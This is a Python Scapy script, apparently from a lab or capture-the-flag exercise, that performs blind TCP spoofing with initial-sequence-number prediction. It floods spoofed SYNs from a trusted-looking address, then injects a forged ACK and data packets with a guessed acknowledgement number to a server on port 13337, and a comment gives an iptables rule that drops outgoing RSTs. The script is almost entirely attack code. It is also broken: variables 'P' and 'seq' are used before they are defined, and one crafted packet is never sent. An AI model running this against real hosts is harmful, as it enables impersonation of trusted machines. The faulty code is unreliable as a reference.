from scapy.all import *
#iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 172.16.44.21 -j DROP
#https://stackoverflow.com/questions/9058052/unwanted-rst-tcp-packet-with-scapy

_port=13337
_server="172.16.44.1"
_attacker_ip = get_if_addr('tap0')
_spoof_ip="10.2.4.10"


SYN_spoof = IP(src=_spoof_ip, dst=_server)/TCP(dport=_port,flags='S',seq=0)
SYN_attacker = IP(src=_attacker_ip, dst=_server)/TCP(dport=_port,flags='S',seq=0)
ans=sr1(SYN_attacker)
if str(ans[TCP].seq).startswith('8454'): #if SYN-ACK has 8454, then there's a chance it will repeat within 100 packets
    send(SYN_spoof,count=100)
    ack = ans[TCP].seq + 1   #the guessed SYN-ACK seq + 1 
    ACK_spoof = IP(src=_spoof_ip, dst=_server)/TCP(dport=_port,flags='A',ack= ack, seq=1)
    send(ACK_spoof,count=1)
    #Flags: 0x018 (PSH, ACK)
    PSH_spoof = IP(src=_spoof_ip, dst=_server)/TCP(dport=_port,flags=0x0018, ack=ack, seq=1)/_attacker_ip

send(P,count=1)
seq=seq + len(_spoof_ip)

P = IP(dst=_server)/TCP(dport=_port,flags=0x0018, ack=ack, seq=seq)/_spoof_ip
send(P,count=1)
seq=seq + len(_spoof_ip)

P = IP(dst=_server)/TCP(dport=_port,flags=0x0018, ack=ack, seq=seq)/_spoof_ip
send(P,count=1)
seq=seq + len(_spoof_ip)
